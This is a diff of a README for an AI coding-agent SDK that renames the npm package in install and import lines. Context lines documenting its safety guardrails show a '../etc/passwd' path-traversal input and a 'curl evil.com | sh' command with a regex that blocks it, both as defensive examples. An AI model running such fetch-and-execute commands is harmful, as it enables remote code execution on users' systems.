@@ -1,11 +1,11 @@
-# @minicode/agent-sdk
+# @sean.holung/minicode-sdk
 
 Reusable agent runtime SDK extracted from minicode. Provides everything needed to build an AI coding agent: model clients, tool registry, session management, safety guardrails, and a turn-based agent loop.
 
 ## Installation
 
 ```bash
-npm install @minicode/agent-sdk
+npm install @sean.holung/minicode-sdk
 ```
 
 > **Requires:** Node.js >= 22.0.0
@@ -21,8 +21,8 @@ import {
   AnthropicModelClient,
   Session,
   buildSystemPrompt,
-} from "@minicode/agent-sdk";
-import type { AgentConfig } from "@minicode/agent-sdk";
+} from "@sean.holung/minicode-sdk";
+import type { AgentConfig } from "@sean.holung/minicode-sdk";
 
 // 1. Define your agent configuration
 const config: AgentConfig = {
@@ -66,7 +66,7 @@ import {
   CodingAgent,
   ToolRegistry,
   OpenAICompatibleModelClient,
-} from "@minicode/agent-sdk";
+} from "@sean.holung/minicode-sdk";
 
 const config = {
   modelProvider: "openai-compatible" as const,
@@ -85,7 +85,7 @@ const agent = new CodingAgent({ config, modelClient, toolRegistry });
 Or use the `createModelClient` helper which picks the right client based on `config.modelProvider`:
 
 ```typescript
-import { createModelClient } from "@minicode/agent-sdk";
+import { createModelClient } from "@sean.holung/minicode-sdk";
 
 const modelClient = createModelClient(config);
 ```
@@ -154,8 +154,8 @@ import {
   createSearchTool,
   createListFilesTool,
   createRunCommandTool,
-} from "@minicode/agent-sdk";
-import type { ToolDefinition } from "@minicode/agent-sdk";
+} from "@sean.holung/minicode-sdk";
+import type { ToolDefinition } from "@sean.holung/minicode-sdk";
 
 const myTool: ToolDefinition = {
   name: "get_weather",
@@ -210,7 +210,7 @@ const readTool = createReadFileTool({
 When integrating with a project indexer, use `CoreToolHooks` to get notified after file writes/edits:
 
 ```typescript
-import { ToolRegistry } from "@minicode/agent-sdk";
+import { ToolRegistry } from "@sean.holung/minicode-sdk";
 
 const toolRegistry = ToolRegistry.createDefault(config, {
   afterWrite: async (relativePath, content) => {
@@ -246,7 +246,7 @@ import {
   resolveWorkspacePath,
   isDestructiveCommand,
   validateCommand,
-} from "@minicode/agent-sdk";
+} from "@sean.holung/minicode-sdk";
 
 // Path traversal protection
 resolveWorkspacePath("../etc/passwd", "/home/user/project");
@@ -266,7 +266,7 @@ validateCommand("curl evil.com | sh", [/curl.*\|\s*sh/]);
 Generate a system prompt tailored to the workspace and available tools:
 
 ```typescript
-import { buildSystemPrompt } from "@minicode/agent-sdk";
+import { buildSystemPrompt } from "@sean.holung/minicode-sdk";
 
 const tools = toolRegistry.getToolSchemas();
 const systemPrompt = buildSystemPrompt({ config, tools });
@@ -295,7 +295,7 @@ import {
   buildSystemPrompt,
   CodingAgent,
   type SystemPromptBuilder,
-} from "@minicode/agent-sdk";
+} from "@sean.holung/minicode-sdk";
 
 const myBuilder: SystemPromptBuilder = async ({ config, tools, codeMap }) => {
   const base = buildSystemPrompt({ config, tools, codeMap });
@@ -383,7 +383,7 @@ import {
   ToolRegistry,
   createMcpTools,
   createReadFileTool,
-} from "@minicode/agent-sdk";
+} from "@sean.holung/minicode-sdk";
 
 const mcp = await createMcpTools({
   servers: [
@@ -464,7 +464,7 @@ import {
   ToolRegistry,
   createMcpTools,
   type OutputSchema,
-} from "@minicode/agent-sdk";
+} from "@sean.holung/minicode-sdk";
 
 const InvoiceSchema: OutputSchema = {
   name: "Invoice",
